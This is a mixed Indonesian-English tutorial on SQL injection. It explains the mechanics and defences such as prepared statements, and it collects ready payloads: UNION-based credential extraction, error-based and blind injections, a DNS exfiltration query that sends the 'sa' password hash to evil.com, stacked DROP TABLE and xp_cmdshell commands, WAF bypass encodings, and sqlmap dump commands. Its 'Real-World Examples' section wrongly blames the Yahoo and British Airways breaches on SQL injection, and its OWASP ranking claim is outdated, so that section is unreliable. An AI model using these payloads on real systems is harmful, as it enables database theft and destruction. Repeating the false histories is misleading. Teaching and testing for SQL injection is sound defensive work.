# SQL Injection - The Database Exploit

## 🎯 Apa Itu SQL Injection?

**SQL Injection (SQLi)** adalah teknik serangan dimana attacker dapat menjalankan arbitrary SQL commands melalui input user yang tidak disanitasi. SQLi memanfaatkan celah dimana input user langsung dimasukkan ke dalam SQL query tanpa validasi, memungkinkan attacker untuk memanipulasi database operations.

### Mengapa Disebut "Injection"?
Karena "injecting" (menyuntikkan) kode SQL berbahaya ke dalam query yang legitimate. Query asli dimodifikasi untuk menjalankan perintah tambahan dari attacker.

## 🔬 Cara Kerja SQL Injection

### Normal SQL Query
```sql
SELECT * FROM users WHERE id = 5;
```
Query di atas aman karena `id = 5` adalah integer literal.

### Vulnerable Query (Dynamic SQL)
```sql
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
echo $query;
```

### Attacker Input: `5 OR 1=1`
Query menjadi:
```sql
SELECT * FROM users WHERE id = 5 OR 1=1;
```
Logic 1=1 always TRUE, sehingga return **semua records**.

### Broken Query Structure
Query asli: `SELECT col FROM table WHERE condition`

Attacker input: `' OR '1'='1' -- `
Hasil query: `SELECT col FROM table WHERE condition=' OR '1'='1' -- '`

Ini membagi WHERE clause menjadi 3 parts:
1. Original condition (now always false)
2. Malicious OR clause (always true)
3. Comment (`--`) yang ignores rest of query

## 🏗️ Teknologi Di Balik SQL Injection

### Database Engine Layer
- **Parser:** Membaca SQL syntax dan convert ke execution plan
- **Query Optimizer:** Find most efficient execution path
- **Execution Engine:** Run physical operations (seeks, scans, joins)

### SQL Language Structure
```sql
[SELECT clause] FROM [table] [JOIN clauses] WHERE [conditions] ORDER BY [column] LIMIT [n]
```

**SQLi Points:**
- WHERE clauses (most common)
- ORDER BY, GROUP BY, HAVING
- UNION SELECT injections
- Subquery injections

### PHP-MySQL Interaction
```php
// Vulnerable (old way)
$username = $_POST['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysql_query($query);  // Deprecated

// Still vulnerable
$query = "SELECT * FROM users WHERE username = '" . $username . "'";

// Safe way
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->bindParam(':username', $username);
$stmt->execute();
```

## 📊 Tipe-Tipe SQL Injection

### Union-Based SQLi (Classic - LOW Difficulty)
**Teknik:** Append UNION clause untuk combine results dari queries berbeda.

#### Discovery
```sql
' UNION SELECT null --
' UNION SELECT null,null --
' UNION SELECT null,null,null --
```
Temukan jumlah columns yang match dengan original query.

#### Data Extraction
```sql
' UNION SELECT 1,version(),database(),user() --
' UNION SELECT 1,table_name,2,3 FROM information_schema.tables --
' UNION SELECT 1,column_name,2,3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1,concat(username,':',password),2,3 FROM users --
```

### Error-Based SQLi (MEDIUM Difficulty)
**Teknik:** Force intentional errors untuk leak information.

#### Database Version
```sql
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) --
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --
```

#### Data Extraction via Errors
```sql
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT (SELECT concat(database()))),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

### Blind SQLi (HIGH Difficulty)
**Tidak ada visible response.** Harus infer melalui behavior differences.

#### Boolean-Based Blind
```sql
' AND (SELECT substring((SELECT database()),1,1)) = 'd  -- Returns true/false
' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)) > 64 --
```

#### Time-Based Blind
```sql
' AND IF((SELECT database())='dvwa',SLEEP(5),0) --
' AND (SELECT CASE WHEN (ascii(substring(database(),1,1))>97) THEN sleep(5) END) --
```

### Out-of-Band SQLi (Advanced)
**Mengirim data melalui network channels.** DNS requests, HTTP requests.

#### DNS Exfiltration
```sql
'; DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 master..sys.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa'); EXEC('master..xp_dirtree "//'+@host+'.evil.com/foo"');
```

## 🛠️ Testing Serangan SQL Injection

### Manual Testing Steps

#### Step 1: Detect Vulnerability
1. **Single Quote Test:** `user'`
2. **Double Quote Test:** `user"`
3. **Backslash Test:** `user\`
4. **SQL Keywords:** `' OR 1=1 --`, `' OR '1'='1 --`

#### Step 2: Balance Query
- Jika error, balance dengan comments: `user' --`
- Jika numeric field: `5 OR 1=1`

#### Step 3: Enumerate Structure
```sql
' ORDER BY 1--            # Test column count
' ORDER BY 100--          # Error = column count
```

#### Step 4: Union Test
```sql
'-1' UNION SELECT 1,2,3--   # Negative untuk skip original
'9999' UNION SELECT 1,2,3-- # High number
```

#### Step 5: Extract Data
- Database version: `@@version`, `version()`
- Current user: `user()`, `current_user()`
- Current DB: `database()`, `db_name()`

### Automated Tools

#### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=pass"

# Cookie-based session
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123"

# Dump all databases
sqlmap -u "http://target.com/vuln.php?id=1" --dbs

# Dump specific table
sqlmap -u "http://target.com/vuln.php?id=1" -D users -T users --dump
```

#### Manual Burp Suite
1. Intercept request dengan parameter
2. Right-click → "Send to Repeater"
3. Manually inject payloads
4. Monitor responses untuk changes

## 🛡️ Prevention & Mitigation

### Input Sanitization
```php
// Bad: Direct concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Better: Type casting
$id = (int) $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";

// Best: Prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### Stored Procedures
```sql
CREATE PROCEDURE GetUser (@UserId INT)
AS
BEGIN
    SELECT * FROM Users WHERE UserId = @UserId
END
```

### ORM (Object-Relational Mapping)
```python
# Using SQLAlchemy (Python)
user = session.query(User).filter_by(id=user_id).first()

# Using Entity Framework (.NET)
var user = context.Users.Where(u => u.Id == userId).FirstOrDefault();
```

### Web Application Firewall (WAF)
- **ModSecurity Core Rule Set**
- **CloudFlare WAF**
- Signature-based detection
- Behavioral analysis

### Input Validation Layers
1. **Client-Side:** HTML5 patterns, JavaScript validation
2. **Server-Side:** PHP filters, type validation
3. **Database:** Stored procedures, least privilege

## 🔍 Real-World Examples

### 2013: Yahoo! Hack
- Compromised 3 billion accounts
- Bad input sanitization
- UNION-based injection

### 2018: British Airways Data Breach
- SQL injection via website
- 400,000 card details stolen
- Failure to patch known vulnerability

### Sony Pictures Hack (2014)
- Initial breach via SQLi
- Led to massive data exfiltration
- Contract details, unreleased films

## 📈 Advanced SQLi Techniques

### Second-Order SQLi
**Penyimpanan data injection untuk eksekusi nanti.**

```php
// Registration stores data
$user_input = $_POST['bio'];  // ' OR 1=1 --

// Later used in different query
$query = "SELECT * FROM users WHERE bio LIKE '%$user_input%'";
// Becomes: WHERE bio LIKE '%' OR 1=1 -- %'
```

### Stacked Queries
**Multiple statements dalam satu query.**

```sql
'; DROP TABLE users; --  # Multiple statements
'; EXEC xp_cmdshell 'net user' ; --  # MSSQL
```

### WAF Bypass Techniques
```sql
# Case variation
'SelEcT' instead of 'SELECT'

# Comments
'/**/OR/**/'1'='1

# Function modifications
coNcAt() instead of concat()

# Encoding
Unicode: %u0027 OR 1=1 --
URL encoding: %27%20OR%201%3D1%2D%2D
```

## 🎯 Impact Assessment

### Confidentiality Impact
- Database dumps
- Authentication bypass
- Credit card information
- Personal data theft

### Integrity Impact
- Data modification
- Insert backdoors
- Update sensitive fields

### Availability Impact
- DROP TABLE commands
- Resource exhaustion
- Denial of service

### Business Impact
- Regulatory fines (GDPR, HIPAA)
- Reputation damage
- Recovery costs

## 📚 Learning Resources

- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **PortSwigger Academy:** Comprehensive labs
- **PentesterLab:** Hands-on Linux environment
- **Books:** "SQL Injection Attacks and Defense" (Indepth)

---

**SQL Injection adalah klasik vulnerability tapi masih #1 di OWASP Top 10.** Master ini adalah foundation untuk semua database security. Practice both manual dan automated testing untuk menjadi expert. 🗃️💉
